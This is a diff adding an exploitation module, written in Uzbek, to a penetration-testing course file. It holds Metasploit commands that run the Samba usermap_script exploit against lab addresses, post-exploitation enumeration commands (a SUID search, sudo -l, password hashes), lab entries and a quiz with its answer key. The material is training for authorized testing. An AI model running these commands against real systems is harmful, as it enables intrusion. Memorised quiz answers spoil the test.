@@ -50,3 +50,57 @@ modules:
         - q: "CVSS 9.8 qaysi daraja?"
           options: [Low, Medium, High, Critical]
           correct: [3]
+  - slug: exploitation
+    title: Ekspluatatsiya va post-ekspluatatsiya
+    level: intermediate
+    lessons:
+      - slug: metasploit
+        title: Metasploit asoslari
+        duration: 25
+        content: |
+          # Metasploit Framework
+
+          ```bash
+          msfconsole -q
+          search samba
+          use exploit/multi/samba/usermap_script
+          show options
+          set RHOSTS 10.200.0.10
+          set LHOST 10.200.0.5
+          run
+          ```
+          Tushunchalar: **exploit** (zaiflikdan foydalanish), **payload** (keyin bajariladigan kod),
+          **bind/reverse shell**, **meterpreter**.
+      - slug: post-exploitation
+        title: Post-ekspluatatsiya
+        duration: 20
+        content: |
+          # Post-ekspluatatsiya
+
+          Kirgandan keyin: `id`, `uname -a`, `sudo -l`, SUID fayllar (`find / -perm -4000`),
+          parol xeshlari, tarmoq (`ip a`, `ss -tulpn`) — yon harakat (lateral movement) uchun.
+
+          Pentester **faqat kelishilgan doirada** ishlaydi va tizimga zarar yetkazmaydi.
+      - slug: reporting
+        title: Pentest hisoboti
+        duration: 20
+        content: |
+          # Hisobot tuzilmasi
+          1. Rahbariyat uchun xulosa
+          2. Doira va metodologiya
+          3. Topilmalar: nom, CVSS, ta'sir, isbot (skrinshot/buyruq), tuzatish tavsiyasi
+          4. Ilovalar
+      - {slug: lab-samba, title: "Amaliyot: Samba usermap_script", lesson_type: lab, lab: exploit-samba-001, duration: 90, content: "CVE-2007-2447."}
+      - {slug: lab-irc, title: "Amaliyot: UnrealIRCd backdoor", lesson_type: lab, lab: exploit-unrealircd-001, duration: 90, content: "CVE-2010-2075 — ta'minot zanjiri hujumi."}
+    quiz:
+      title: Ekspluatatsiya testi
+      passing_score: 70
+      questions:
+        - {q: "Zaiflikdan foydalangandan keyin bajariladigan kod", options: [Exploit, Payload, Scanner, Listener], correct: [1]}
+        - {q: "Nishon hujumchiga o'zi ulanadigan shell", options: [Bind shell, Reverse shell, Web shell, Root shell], correct: [1]}
+        - {q: "Metasploit'da nishonni belgilovchi parametr", options: [LHOST, RHOSTS, LPORT, PAYLOAD], correct: [1]}
+        - {q: "SUID fayllarni topish buyrug'i", options: ["find / -perm -4000", "ls -la /root", "chmod 777 /", "ps aux"], correct: [0]}
+        - {q: "Hisobotda har bir topilma uchun nima bo'lishi kerak?", type: multiple, options: [Ta'sir, Isbot, Tuzatish tavsiyasi, Hujumchining ismi], correct: [0, 1, 2]}
+        - {q: "UnrealIRCd backdoor qanday paydo bo'lgan?", options: ["Konfiguratsiya xatosi", "Tarqatilgan arxivga qo'shilgan zararli kod", "Zaif parol", "SQL injection"], correct: [1]}
+        - {q: "Samba usermap_script CVE raqami", options: ["CVE-2011-2523", "CVE-2007-2447", "CVE-2014-0160", "CVE-2017-0144"], correct: [1]}
+        - {q: "Kelishilgan doiradan tashqaridagi tizimni test qilish", options: [Ruxsat etiladi, "Qonunbuzarlik", "Faqat kechasi mumkin", "Faqat skanerlash mumkin"], correct: [1]}
